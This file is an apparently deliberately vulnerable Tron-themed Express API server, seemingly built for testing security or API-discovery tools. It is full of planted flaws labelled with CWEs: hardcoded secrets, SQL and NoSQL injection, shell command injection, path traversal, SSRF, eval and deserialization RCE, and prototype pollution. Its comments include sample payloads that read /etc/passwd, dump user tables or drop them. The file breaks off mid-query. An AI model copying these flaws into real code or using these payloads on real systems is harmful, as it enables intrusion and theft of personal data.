/**
 * THE GRID - TRON API SERVER
 * ============================================================
 * End of Line Club API Gateway — Flynn's Arcade Systems, Inc.
 * "The Grid. A digital frontier. I tried to picture clusters of
 *  information as they moved through the computer... Programs
 *  fighting programs." — Kevin Flynn
 *
 * INTERNAL CLASSIFICATION: TRON-ARES OPERATIVE INFRASTRUCTURE
 * Maintained by: CLU 2.0 Systems Division
 * WARNING: This server controls access to the entire Grid.
 * Unauthorized derezzification will be prosecuted.
 * ============================================================
 */

'use strict';

const express              = require('express');
const jwt                  = require('jsonwebtoken');
const mongoose             = require('mongoose');
const crypto               = require('crypto');
const path                 = require('path');
const fs                   = require('fs');
const { exec, execSync }   = require('child_process');
const axios                = require('axios');
const serialize            = require('node-serialize');
const _                    = require('lodash');
const bodyParser           = require('body-parser');
const cors                 = require('cors');
const mysql                = require('mysql2');
const vm                   = require('vm');

const app = express();

// ============================================================
// VULNERABILITY: Overly permissive CORS — allows any origin
// ============================================================
app.use(cors({ origin: '*', credentials: true }));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());

// ============================================================
// VULNERABILITY: Hardcoded credentials & secrets
// CWE-798: Use of Hard-coded Credentials
// ============================================================
const JWT_SECRET          = 'tron_master_control_program_secret_key_12345';
const ADMIN_TOKEN         = 'flynns-arcade-admin-token-abcdef1234567890';
const DB_PASSWORD         = 'ZeusISOpassw0rd!CLU_override';
const ENCRYPTION_KEY      = 'mcp-encryption-key-000000000000000';
const GRID_API_KEY        = 'sk-grid-9f8e7d6c5b4a321098765432100fedcba';
const CLU_MASTER_OVERRIDE = 'clu2-master-override-rinzler-2010';
// VULNERABILITY: Hardcoded MySQL root credentials — CWE-798
const MYSQL_HOST     = 'localhost';
const MYSQL_USER     = 'grid_root';
const MYSQL_PASSWORD = 'Encom-1982-Flynn!GridDB#root';   // plaintext in source
const MYSQL_DATABASE = 'tron_grid_sql';
const STRIPE_SECRET  = 'sk_live_tronAres9f4a2b1c3d5e6f7890abcdef';  // VULNERABILITY: live API key hardcoded
const AWS_ACCESS_KEY = 'AKIAIOSFODNN7ENCOMGRD';                     // VULNERABILITY: AWS key hardcoded
const AWS_SECRET_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYENcomGrid1982'; // VULNERABILITY: AWS secret hardcoded

// ============================================================
// MySQL Connection Pool — Grid SQL registry (polyglot persistence)
// VULNERABILITY: Hardcoded credentials, no SSL, root user
// CWE-798 + CWE-311: Missing Encryption of Sensitive Data
// ============================================================
const mysqlPool = mysql.createPool({
  host:            MYSQL_HOST,
  port:            3306,
  user:            MYSQL_USER,
  password:        MYSQL_PASSWORD,
  database:        MYSQL_DATABASE,
  connectionLimit: 10,
  ssl:             false,   // VULNERABILITY: TLS disabled for MySQL connection
});

// ============================================================
// MongoDB Connection
// VULNERABILITY: Credentials embedded in connection string
// ============================================================
mongoose.connect(
  `mongodb://clu_admin:${DB_PASSWORD}@localhost:27017/the_grid?authSource=admin`,
  { useNewUrlParser: true, useUnifiedTopology: true }
);

// ============================================================
// Mongoose Schemas — Grid Entity Models
// ============================================================
const ProgramSchema = new mongoose.Schema({
  name:       String,
  identity:   String,
  sector:     String,
  loyalty:    String,
  discColor:  String,
  isIso:      Boolean,
  createdAt:  { type: Date, default: Date.now },
});

const UserSchema = new mongoose.Schema({
  username:     String,
  password:     String,  // VULNERABILITY: stored plaintext fallback path
  email:        String,
  role:         String,
  gridToken:    String,
  ssn:          String,  // VULNERABILITY: PII stored in DB unmasked
  creditCard:   String,  // VULNERABILITY: PCI data stored in DB
  secretDisc:   String,
});

const CycleSchema = new mongoose.Schema({
  rider:      String,
  sector:     String,
  startTime:  Date,
  endTime:    Date,
  isActive:   Boolean,
});

const Program = mongoose.model('Program', ProgramSchema);
const User    = mongoose.model('User', UserSchema);
const Cycle   = mongoose.model('Cycle', CycleSchema);

// ============================================================
// Auth Middleware
// VULNERABILITY: JWT verification using HS256 with weak secret,
//   and algorithm is not pinned — allows alg:none attack
// CWE-327: Use of a Broken or Risky Cryptographic Algorithm
// ============================================================
const authenticateToken = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.status(401).json({ error: 'No identity disc presented' });

  // VULNERABILITY: accepts any algorithm the token header declares
  jwt.verify(token, JWT_SECRET, (err, program) => {
    if (err) return res.status(403).json({ error: 'Disc rejected by Grid security' });
    req.program = program;
    next();
  });
};

// Weak admin check — only validates a static string
const requireAdmin = (req, res, next) => {
  const adminKey = req.headers['x-grid-admin-key'];
  // VULNERABILITY: Timing attack — string comparison not constant-time
  if (adminKey === ADMIN_TOKEN) {
    next();
  } else {
    res.status(403).json({ error: 'CLU override required' });
  }
};

// ============================================================
//  ██████╗  ██████╗  ██████╗ ██╗   ██╗███╗   ███╗███████╗███╗   ██╗████████╗███████╗██████╗
// ██╔══██╗██╔═══██╗██╔════╝ ██║   ██║████╗ ████║██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
// ██║  ██║██║   ██║██║      ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║   ██║   █████╗  ██║  ██║
// ██║  ██║██║   ██║██║      ██║   ██║██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ██║  ██║
// ██████╔╝╚██████╔╝╚██████╗ ╚██████╔╝██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   ███████╗██████╔╝
// ╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═════╝
//
//  API v2 — OFFICIAL / DOCUMENTED ENDPOINTS
//  These endpoints are described in openapi.yaml
// ============================================================

/**
 * @route GET /api/v2/programs
 * @documented yes
 * @description List all programs in the Grid
 */
app.get('/api/v2/programs', authenticateToken, async (req, res) => {
  try {
    const { sector, loyalty, search } = req.query;

    // ============================================================
    // VULNERABILITY: SQL/NoSQL Injection via string interpolation
    // CWE-89 / CWE-943: Improper Neutralization of Special Elements
    // User-controlled input directly used in MongoDB $where clause
    // ============================================================
    let filter = {};
    if (sector)  filter.sector  = sector;
    if (loyalty) filter.loyalty = loyalty;
    if (search) {
      // VULNERABILITY: $where injection — attacker can execute JS on the DB
      filter = { $where: `this.name.includes('${search}') || this.identity.includes('${search}')` };
    }

    const programs = await Program.find(filter);

    // VULNERABILITY: Sensitive data in logs — identity discs are credentials
    console.log(`[GRID-AUDIT] Program query by ${req.program.username}: filter=${JSON.stringify(filter)}`);

    res.json({ programs, gridCycles: Date.now() });
  } catch (err) {
    // VULNERABILITY: Full stack trace exposed to client
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

/**
 * @route GET /api/v2/programs/:id
 * @documented yes
 * @description Get a specific program by Grid identity
 */
app.get('/api/v2/programs/:id', authenticateToken, async (req, res) => {
  try {
    // VULNERABILITY: IDOR — no ownership check, any authenticated program
    //   can fetch any other program's disc data
    // CWE-639: Authorization Bypass Through User-Controlled Key
    const program = await Program.findById(req.params.id);
    if (!program) return res.status(404).json({ error: 'Program not found on the Grid' });

    res.json(program);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route POST /api/v2/programs
 * @documented yes
 * @description Instantiate a new program on the Grid
 */
app.post('/api/v2/programs', authenticateToken, async (req, res) => {
  try {
    const { name, identity, sector, loyalty, discColor, isIso } = req.body;

    // VULNERABILITY: Mass assignment — all fields trusted from user input
    // CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
    const newProgram = new Program(req.body);
    await newProgram.save();

    res.status(201).json({ message: 'Program instantiated on the Grid', program: newProgram });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route POST /api/v2/users/login
 * @documented yes
 * @description Authenticate a program / Grid user
 */
app.post('/api/v2/users/login', async (req, res) => {
  const { username, password } = req.body;

  // VULNERABILITY: Sensitive data written to application logs
  // CWE-532: Insertion of Sensitive Information into Log File
  console.log(`[GRID-AUTH] Login attempt — user: ${username}, pass: ${password}`);

  try {
    // VULNERABILITY: NoSQL injection — attacker can pass { $gt: '' } as password
    // to bypass authentication entirely
    // CWE-943: Improper Neutralization of Special Elements in Data Query Logic
    const user = await User.findOne({ username: username, password: password });

    if (!user) {
      return res.status(401).json({ error: 'Identity not recognized — End of Line' });
    }

    // VULNERABILITY: JWT signed with weak hardcoded secret, no expiry set
    // CWE-347: Improper Verification of Cryptographic Signature
    const token = jwt.sign(
      { id: user._id, username: user.username, role: user.role },
      JWT_SECRET
      // NOTE: no expiresIn — token never expires
    );

    // VULNERABILITY: Returning PII in login response
    res.json({
      token,
      user: {
        id:         user._id,
        username:   user.username,
        email:      user.email,
        ssn:        user.ssn,         // PII leaked in response
        creditCard: user.creditCard,  // PCI data leaked in response
        role:       user.role,
      },
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route GET /api/v2/grid/status
 * @documented yes
 * @description Get the current state of the Grid
 */
app.get('/api/v2/grid/status', authenticateToken, async (req, res) => {
  try {
    const programCount = await Program.countDocuments();
    const cycleCount   = await Cycle.countDocuments({ isActive: true });

    res.json({
      status:          'GRID_ONLINE',
      sector:          'Tron City',
      programs:        programCount,
      activeCycles:    cycleCount,
      masterControl:   'CLU 2.0',
      gridVersion:     'TRON-ARES-BUILD-0.9.1',
      internalBuild:   process.env.BUILD_SECRET || 'local-dev-9f4a2b',  // VULNERABILITY: env leak
      nodeVersion:     process.version,
      platform:        process.platform,
      serverUptime:    process.uptime(),
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route GET /api/v2/isos
 * @documented yes
 * @description List all ISO (Isomorphic Algorithm) programs
 */
app.get('/api/v2/isos', authenticateToken, async (req, res) => {
  try {
    const isos = await Program.find({ isIso: true });
    res.json({ isos, message: 'The ISOs are the key to the next frontier.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route GET /api/v2/users/profile
 * @documented yes
 * @description Get the authenticated program's profile
 */
app.get('/api/v2/users/profile', authenticateToken, async (req, res) => {
  try {
    const user = await User.findById(req.program.id);
    if (!user) return res.status(404).json({ error: 'Program derezzed or not found' });

    res.json({
      id:       user._id,
      username: user.username,
      email:    user.email,
      role:     user.role,
      // VULNERABILITY: Accidentally returning sensitive fields
      secretDisc: user.secretDisc,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route POST /api/v2/grid/cycles
 * @documented yes
 * @description Initiate a new Light Cycle on the Grid
 */
app.post('/api/v2/grid/cycles', authenticateToken, async (req, res) => {
  try {
    const { rider, sector } = req.body;
    const cycle = new Cycle({ rider, sector, startTime: new Date(), isActive: true });
    await cycle.save();
    res.status(201).json({ message: 'Light Cycle initiated', cycle });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * @route PUT /api/v2/users/password
 * @documented yes
 * @description Update program identity credentials
 */
app.put('/api/v2/users/password', authenticateToken, async (req, res) => {
  const { currentPassword, newPassword } = req.body;

  // VULNERABILITY: Weak hashing algorithm (MD5) for passwords
  // CWE-327: Use of a Broken or Risky Cryptographic Algorithm
  const hashedNew = crypto.createHash('md5').update(newPassword).digest('hex');

  try {
    await User.findByIdAndUpdate(req.program.id, { password: hashedNew });
    res.json({ message: 'Identity disc updated' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});


// ============================================================
//  ██████╗ ██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗      █████╗ ██████╗ ██╗███████╗
// ██╔════╝ ██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║     ██╔══██╗██╔══██╗██║██╔════╝
// ╚█████╗  ███████║███████║██║  ██║██║   ██║██║ █╗ ██║     ███████║██████╔╝██║███████╗
//  ╚═══██╗ ██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║     ██╔══██║██╔═══╝ ██║╚════██║
// ██████╔╝ ██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝     ██║  ██║██║     ██║███████║
// ╚═════╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
//
//  SHADOW APIs — UNDOCUMENTED, NOT IN OPENAPI SPEC
//  Hidden endpoints that exist in the Grid but are NOT declared.
//  These represent APIs discovered through runtime analysis only.
// ============================================================

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/users/export
 * @description Bulk export ALL user data — NO AUTHENTICATION REQUIRED
 * This was added as a "temporary" data migration endpoint and never removed.
 * VULNERABILITY: Broken Object Level Authorization + Missing Auth
 * CWE-862: Missing Authorization
 */
app.get('/api/v2/users/export', async (req, res) => {
  try {
    // No auth middleware — any request can dump the entire user database
    const users = await User.find({}).select('+password +ssn +creditCard +secretDisc');
    res.json({
      export:     users,
      exportedAt: new Date().toISOString(),
      totalUsers: users.length,
      note:       'Flynn private data archive — DO NOT EXPOSE',
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/admin/users/reset
 * @description Force-reset any user's credentials (admin backdoor)
 * VULNERABILITY: Broken Function Level Authorization, hardcoded bypass
 * CWE-285: Improper Authorization
 */
app.post('/api/v2/admin/users/reset', async (req, res) => {
  const { userId, newPassword, masterKey } = req.body;

  // VULNERABILITY: Authentication logic bypass with hardcoded key
  if (masterKey !== CLU_MASTER_OVERRIDE) {
    return res.status(403).json({ error: 'Master override rejected' });
  }

  try {
    // VULNERABILITY: Plaintext password stored after reset
    await User.findByIdAndUpdate(userId, { password: newPassword });
    console.log(`[SHADOW-ADMIN] Password reset for userId=${userId} — master override used`);
    res.json({ message: 'Program credentials overwritten by CLU directive' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route DELETE /api/v2/programs/:id/force
 * @description Force-derezz (delete) any program, bypasses soft-delete
 * VULNERABILITY: No authorization check, no audit logging
 * CWE-862: Missing Authorization
 */
app.delete('/api/v2/programs/:id/force', async (req, res) => {
  try {
    // No auth, no audit — just derezzes the program
    await Program.findByIdAndDelete(req.params.id);
    res.json({ message: 'Program derezzed. End of Line.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/grid/ping
 * @description Grid node connectivity diagnostic — COMMAND INJECTION
 * VULNERABILITY: OS Command Injection via unsanitized user input
 * CWE-78: Improper Neutralization of Special Elements used in an OS Command
 */
app.get('/api/v2/grid/ping', authenticateToken, (req, res) => {
  const { host } = req.query;

  if (!host) return res.status(400).json({ error: 'Target node required' });

  // VULNERABILITY: Unsanitized user input passed directly to shell
  // Attacker payload: ?host=localhost;cat /etc/passwd
  exec(`ping -c 4 ${host}`, { timeout: 8000 }, (err, stdout, stderr) => {
    if (err) {
      return res.status(500).json({ error: stderr });
    }
    res.json({ result: stdout, gridNode: host });
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/grid/files
 * @description Retrieve Grid sector data files — PATH TRAVERSAL
 * VULNERABILITY: Path Traversal via unsanitized file parameter
 * CWE-22: Improper Limitation of a Pathname to a Restricted Directory
 */
app.get('/api/v2/grid/files', authenticateToken, (req, res) => {
  const { file } = req.query;

  if (!file) return res.status(400).json({ error: 'File identifier required' });

  // VULNERABILITY: No path sanitization — attacker can use ../../etc/passwd
  const filePath = path.join(__dirname, 'grid_data', file);

  fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) return res.status(404).json({ error: 'Grid sector file not found' });
    res.json({ file, contents: data });
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/grid/webhook
 * @description Trigger Grid-to-Grid event callback — SSRF
 * VULNERABILITY: Server-Side Request Forgery — attacker can reach internal services
 * CWE-918: Server-Side Request Forgery (SSRF)
 */
app.post('/api/v2/grid/webhook', authenticateToken, async (req, res) => {
  const { callbackUrl, payload } = req.body;

  if (!callbackUrl) return res.status(400).json({ error: 'Callback URL required' });

  try {
    // VULNERABILITY: User-supplied URL with no allowlist validation
    // Attacker can target: http://169.254.169.254/latest/meta-data/ (AWS metadata)
    //                      http://localhost:6379 (Redis)
    //                      http://internal-service/admin
    const response = await axios.post(callbackUrl, payload, {
      timeout: 5000,
      // VULNERABILITY: SSL cert validation disabled
      httpsAgent: new (require('https').Agent)({ rejectUnauthorized: false }),
    });
    res.json({ status: 'Grid event dispatched', responseStatus: response.status });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route POST /api/v2/programs/execute
 * @description Execute a Grid program instruction set — REMOTE CODE EXECUTION
 * VULNERABILITY: Arbitrary Code Execution via eval()
 * CWE-94: Improper Control of Generation of Code
 */
app.post('/api/v2/programs/execute', requireAdmin, (req, res) => {
  const { instruction } = req.body;

  // VULNERABILITY: Direct eval of user-supplied code
  // "This is the most powerful weapon in the Grid." — CLU
  try {
    // eslint-disable-next-line no-eval
    const result = eval(instruction);
    res.json({ result, message: 'Instruction executed on the Grid' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /_internal/health/debug
 * @description Internal health check with full system diagnostics
 * VULNERABILITY: Information Disclosure — exposes secrets, env vars, DB config
 * CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
 */
app.get('/_internal/health/debug', (req, res) => {
  // No auth — completely open internal endpoint
  res.json({
    status:          'OPERATIONAL',
    environment:     process.env,              // VULNERABILITY: ALL env vars exposed
    config: {
      jwtSecret:     JWT_SECRET,               // VULNERABILITY: secret exposed
      adminToken:    ADMIN_TOKEN,              // VULNERABILITY: admin token exposed
      gridApiKey:    GRID_API_KEY,             // VULNERABILITY: API key exposed
      cluOverride:   CLU_MASTER_OVERRIDE,      // VULNERABILITY: master key exposed
      dbUri:         `mongodb://clu_admin:${DB_PASSWORD}@localhost:27017/the_grid`,
    },
    memory:          process.memoryUsage(),
    uptime:          process.uptime(),
    pid:             process.pid,
    nodeVersion:     process.version,
    dependencies:    require('./package.json').dependencies,
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /admin/dashboard
 * @description CLU's Grid Administration Dashboard
 * VULNERABILITY: No authentication on admin panel, XSS in query reflection
 * CWE-79: Improper Neutralization of Input During Web Page Generation
 */
app.get('/admin/dashboard', (req, res) => {
  const { message, programFilter } = req.query;

  // VULNERABILITY: Reflected XSS — user input directly interpolated into HTML
  const dashboardHtml = `
    <!DOCTYPE html>
    <html>
    <head><title>CLU Grid Administration — TRON ARES</title></head>
    <body>
      <h1>THE GRID — MASTER CONTROL PANEL</h1>
      <p>Welcome, CLU. You are in control of the Grid.</p>
      ${message ? `<div class="notification">${message}</div>` : ''}
      <div>
        <h2>Program Filter Active: ${programFilter || 'ALL'}</h2>
      </div>
      <p><strong>GRID_API_KEY:</strong> ${GRID_API_KEY}</p>
      <p><strong>BUILD:</strong> TRON-ARES-0.9.1-CLASSIFIED</p>
    </body>
    </html>
  `;
  res.setHeader('Content-Type', 'text/html');
  res.send(dashboardHtml);
});


// ============================================================
//  ███████╗ ██████╗ ███╗   ███╗██████╗ ██╗███████╗      █████╗ ██████╗ ██╗███████╗
//  ╚════██║██╔═══██╗████╗ ████║██╔══██╗██║██╔════╝     ██╔══██╗██╔══██╗██║██╔════╝
//      ██╔╝██║   ██║██╔████╔██║██████╔╝██║█████╗       ███████║██████╔╝██║███████╗
//     ██╔╝ ██║   ██║██║╚██╔╝██║██╔══██╗██║██╔══╝       ██╔══██║██╔═══╝ ██║╚════██║
//     ██║  ╚██████╔╝██║ ╚═╝ ██║██████╔╝██║███████╗     ██║  ██║██║     ██║███████║
//     ╚═╝   ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝╚══════╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
//
//  ZOMBIE APIs — DEPRECATED / ORPHANED ENDPOINTS STILL RUNNING
//  Version 1 and Legacy endpoints that were never decommissioned.
//  Still accessible, still vulnerable, nobody knows they exist.
// ============================================================

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v1 - deprecated 2021)
 * @route GET /api/v1/programs
 * @description Original v1 program listing — NO AUTHENTICATION
 * This endpoint was "replaced" by v2 but never removed from the codebase.
 * VULNERABILITY: Missing authentication, exposes internal fields
 */
app.get('/api/v1/programs', async (req, res) => {
  try {
    const { name } = req.query;

    // VULNERABILITY: SQL-style injection via raw string in $where — v1 had no sanitization
    let query = {};
    if (name) {
      query = { $where: `this.name == '${name}'` };
    }

    const programs = await Program.find(query);
    res.json({
      programs,
      version:   'v1',
      deprecated: true,
      warning:   'This endpoint is scheduled for decommissioning. Migrate to v2.',
      // VULNERABILITY: v1 returns internal fields that v2 filters out
      internalNote: 'CLU directive: keep v1 online for legacy ISO tracking',
    });
  } catch (err) {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v1 - deprecated 2021)
 * @route POST /api/v1/login
 * @description Original v1 authentication — MD5 + Base64, no rate limiting
 * VULNERABILITY: Weak auth algorithm, no lockout, no rate limiting
 * CWE-307: Improper Restriction of Excessive Authentication Attempts
 */
app.post('/api/v1/login', async (req, res) => {
  const { username, password } = req.body;

  // VULNERABILITY: MD5 hash comparison — easily rainbow-tabled
  const hashedPass = crypto.createHash('md5').update(password).digest('hex');

  try {
    const user = await User.findOne({ username, password: hashedPass });

    if (!user) {
      return res.status(401).json({ error: 'Not a user. Not a program. End of Line.' });
    }

    // VULNERABILITY: v1 tokens never expire and use base64 encoding (not a real JWT)
    const legacyToken = Buffer.from(
      JSON.stringify({ id: user._id, username: user.username, role: user.role, iat: Date.now() })
    ).toString('base64');

    res.json({
      token:   legacyToken,
      version: 'v1-deprecated',
      message: 'v1 auth is deprecated. Grid Admin has been notified.',
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v1 - deprecated 2021)
 * @route GET /api/v1/users
 * @description Original v1 user listing — completely unauthenticated
 * VULNERABILITY: Full user list exposed with no auth whatsoever
 * CWE-862: Missing Authorization
 */
app.get('/api/v1/users', async (req, res) => {
  try {
    // VULNERABILITY: Returns ALL users with sensitive fields, no auth
    const users = await User.find({});
    res.json({
      users,
      version:    'v1',
      deprecated: true,
      count:      users.length,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v1 - deprecated 2021)
 * @route GET /api/v1/grid
 * @description Original v1 Grid status — leaks more internals than v2
 */
app.get('/api/v1/grid', async (req, res) => {
  res.json({
    status:          'GRID_V1_LEGACY_ACTIVE',
    masterControl:   'MCP (original)',
    version:         'v1',
    internalBuild:   'tron-legacy-build-2010-classified',
    dbHost:          'localhost:27017',
    dbName:          'the_grid',
    dbUser:          'clu_admin',            // VULNERABILITY: DB credentials leaked
    dbPassword:      DB_PASSWORD,            // VULNERABILITY: DB password leaked
    deploymentEnv:   process.env.NODE_ENV || 'production',
    secretConfig:    {
      jwtSecret: JWT_SECRET,
      apiKey:    GRID_API_KEY,
    },
  });
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v1 - deprecated 2021)
 * @route GET /api/v1/grid/cycles
 * @description v1 cycle tracking — no pagination, dumps entire table
 */
app.get('/api/v1/grid/cycles', async (req, res) => {
  try {
    // VULNERABILITY: No pagination — can return millions of records (DoS via data dump)
    const cycles = await Cycle.find({});
    res.json({ cycles, total: cycles.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v0 - legacy circa 2008, Flynn's original code)
 * @route GET /v0/legacy/programs
 * @description Flynn's original program registry — insecure deserialization
 * VULNERABILITY: Remote Code Execution via node-serialize IIFE deserialization
 * CWE-502: Deserialization of Untrusted Data
 */
app.post('/v0/legacy/programs/restore', (req, res) => {
  const { archiveData } = req.body;

  if (!archiveData) return res.status(400).json({ error: 'Archive data required' });

  try {
    // VULNERABILITY: node-serialize allows executing IIFE functions during deserialization
    // Payload: {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id');}()"}
    const restored = serialize.unserialize(archiveData);
    res.json({ restored, message: 'Legacy program restored from Flynn\'s Archive' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (v0 - Flynn's original code)
 * @route GET /v0/legacy/users
 * @description Kevin Flynn's original user system from the arcade days
 * VULNERABILITY: No auth, exposes everything, uses lodash merge for deep clone (prototype pollution)
 */
app.put('/v0/legacy/users/:id', async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return res.status(404).json({ error: 'User not in Flynn\'s archive' });

    // VULNERABILITY: Prototype Pollution via lodash merge with user input
    // CWE-1321: Improperly Controlled Modification of Object Prototype Attributes
    // Attacker payload: { "__proto__": { "isAdmin": true } }
    const updated = _.merge({}, user.toObject(), req.body);
    await User.findByIdAndUpdate(req.params.id, updated);

    res.json({ message: 'Legacy user updated', user: updated });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

/**
 * ZOMBIE API — NOT IN OPENAPI SPEC (Rinzler's recon endpoint — never decommissioned)
 * @route GET /v0/legacy/recon
 * @description Rinzler's internal reconnaissance API — system info dump
 */
app.get('/v0/legacy/recon', (req, res) => {
  // VULNERABILITY: Full environment and system info exposed, no auth
  res.json({
    reconnaissance: 'RINZLER_ACTIVE',
    env:            process.env,
    cwd:            process.cwd(),
    execPath:       process.execPath,
    argv:           process.argv,
    networkInterfaces: require('os').networkInterfaces(),
    hostname:       require('os').hostname(),
  });
});


// ============================================================
// ADDITIONAL SHADOW API: Tron Ares Integration Endpoint
// Shadow — not in OpenAPI spec, added for the new Ares chapter
// ============================================================

/**
 * SHADOW API — NOT IN OPENAPI SPEC (Tron Ares era)
 * @route POST /api/v2/ares/sync
 * @description Sync Grid state to Ares dimension — no validation, SSRF + XXE potential
 * VULNERABILITY: XXE via XML body parsing + SSRF via destination URL
 */
app.post('/api/v2/ares/sync', authenticateToken, (req, res) => {
  const { destination, xmlPayload } = req.body;

  // VULNERABILITY: Parsing user-supplied XML without disabling external entities (XXE)
  // CWE-611: Improper Restriction of XML External Entity Reference
  const xml2js = require('xml2js');
  const parser  = new xml2js.Parser({ explicitArray: false }); // XXE not prevented

  parser.parseString(xmlPayload, async (err, result) => {
    if (err) return res.status(400).json({ error: 'Invalid Ares transmission packet' });

    // VULNERABILITY: SSRF — destination not validated
    try {
      await axios.post(destination, result, { timeout: 3000 });
      res.json({ message: 'Ares sync transmitted', result });
    } catch (syncErr) {
      res.status(500).json({ error: syncErr.message });
    }
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/ares/portal
 * @description Ares portal generation — open redirect
 * VULNERABILITY: Open Redirect via unvalidated URL parameter
 * CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
 */
app.get('/api/v2/ares/portal', (req, res) => {
  const { returnUrl } = req.query;
  // VULNERABILITY: Open redirect — no validation of returnUrl
  if (returnUrl) {
    return res.redirect(returnUrl);
  }
  res.json({ portal: 'ARES_DIMENSION_GATEWAY', status: 'STANDBY' });
});


// ============================================================
// ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗
// ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║
// ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║
// ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║
// ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║███████╗
//  ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
//
//  CRITICAL SHADOW APIs — SQL INJECTION, RCE, XSS
//  Added for Ares integration, never documented or reviewed.
// ============================================================

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/programs/search
 * @description Full-text program search against SQL registry
 * VULNERABILITY: SQL Injection — user input concatenated directly into query string
 * CWE-89: Improper Neutralization of Special Elements used in an SQL Command
 */
app.get('/api/v2/programs/search', authenticateToken, (req, res) => {
  const name   = req.query.name   || '';
  const sector = req.query.sector || '';
  const loyalty = req.query.loyalty || '';

  // VULNERABILITY: CWE-89 SQL Injection — all three params unsanitized
  // Payload: ?name=tron' OR '1'='1
  // Payload: ?name=x' UNION SELECT username,password,ssn,creditCard,NULL FROM users--
  const query = `SELECT id, name, sector, loyalty, disc_color FROM programs
                 WHERE name = '${name}'
                 AND sector = '${sector}'
                 AND loyalty = '${loyalty}'`;

  mysqlPool.query(query, (err, results) => {
    if (err) {
      // VULNERABILITY: Raw SQL error returned to client — reveals schema
      return res.status(500).json({ error: err.message, sqlState: err.sqlState, query });
    }
    res.json({ programs: results, query });  // VULNERABILITY: query string returned to client
  });
});

/**
 * SHADOW API — NOT IN OPENAPI SPEC
 * @route GET /api/v2/users/lookup
 * @description Look up a Grid user account by username or email
 * VULNERABILITY: SQL Injection via ORDER BY clause and UNION attack
 * CWE-89: SQL Injection
 */
app.get('/api/v2/users/lookup', authenticateToken, (req, res) => {
  const { username, email, orderBy } = req.query;

  // VULNERABILITY: ORDER BY injection — cannot use parameterized queries for column names
  // Payload: ?orderBy=username; DROP TABLE users--
  // Payload: ?username=admin'--
  const query = `SELECT id, username, email, role, created_at
                 FROM grid_users
